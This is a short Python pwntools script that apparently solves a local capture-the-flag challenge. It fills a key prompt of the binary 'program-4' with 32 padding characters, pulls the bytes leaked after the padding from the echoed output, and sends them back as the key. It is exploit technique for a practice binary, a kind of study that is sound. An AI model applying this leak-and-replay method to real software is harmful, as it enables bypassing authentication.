from pwn import *

p = process('./../bin/program-4')

p.recvuntil('give me the key --> ')
p.send('a'*32)

data = p.recvuntil('\n')
p.recvuntil('give me the key --> ')
p.send(str(data).split('a'*32)[1][:31] + '\0')
print(str(p.recvuntil('\n')))